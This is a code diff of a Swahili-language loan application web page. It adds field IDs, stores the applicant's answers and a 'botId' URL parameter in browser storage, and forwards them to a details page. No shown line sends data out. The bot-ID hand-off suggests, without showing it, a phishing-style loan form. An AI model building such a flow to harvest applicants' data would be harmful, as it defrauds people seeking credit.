@@ -1,4 +1,3 @@
-```html
 <!DOCTYPE html>
 <html lang="sw">
 <head>
@@ -197,7 +196,7 @@ textarea{
             <div class="form-group">
                 <label>Aina ya Mkopo</label>
 
-                <select required>
+                <select required id="loanType">
                     <option value="">Chagua aina ya mkopo</option>
                     <option>Mkopo wa Kibinafsi</option>
                     <option>Mkopo wa Biashara</option>
@@ -212,6 +211,7 @@ textarea{
 
                 <input
                     type="number"
+                    id="loanAmount"
                     value="1000000"
                     required>
             </div>
@@ -219,7 +219,7 @@ textarea{
             <div class="form-group">
                 <label>Muda wa Mkopo</label>
 
-                <select required>
+                <select required id="loanDuration">
                     <option>Miezi 6</option>
                     <option>Miezi 12</option>
                     <option>Miezi 24</option>
@@ -233,6 +233,7 @@ textarea{
                 <label>Kusudi la Mkopo</label>
 
                 <textarea
+                    id="loanPurpose"
                     placeholder="Elezea kusudi la mkopo wako..."
                     required></textarea>
             </div>
@@ -248,15 +249,35 @@ textarea{
 </div>
 
 <script>
-document.getElementById("loanForm").addEventListener("submit", function(e){
+// Get botId from URL
+const urlParams = new URLSearchParams(window.location.search);
+const botId = urlParams.get('botId');
+console.log('Bot ID on form page:', botId);
 
+// Store botId
+if (botId) {
+    localStorage.setItem('botId', botId);
+}
+
+document.getElementById("loanForm").addEventListener("submit", function(e){
     e.preventDefault();
 
-    window.location.href = "details.html";
+    // Save form data to localStorage
+    const loanType = document.getElementById('loanType').value;
+    const loanAmount = document.getElementById('loanAmount').value;
+    const loanDuration = document.getElementById('loanDuration').value;
+    const loanPurpose = document.getElementById('loanPurpose').value;
 
+    localStorage.setItem('loanType', loanType);
+    localStorage.setItem('loanAmount', loanAmount);
+    localStorage.setItem('loanDuration', loanDuration);
+    localStorage.setItem('loanPurpose', loanPurpose);
+
+    // Redirect to details page with botId
+    const botIdParam = botId || localStorage.getItem('botId') || '';
+    window.location.href = `details.html?botId=${botIdParam}`;
 });
 </script>
 
 </body>
 </html>
-```
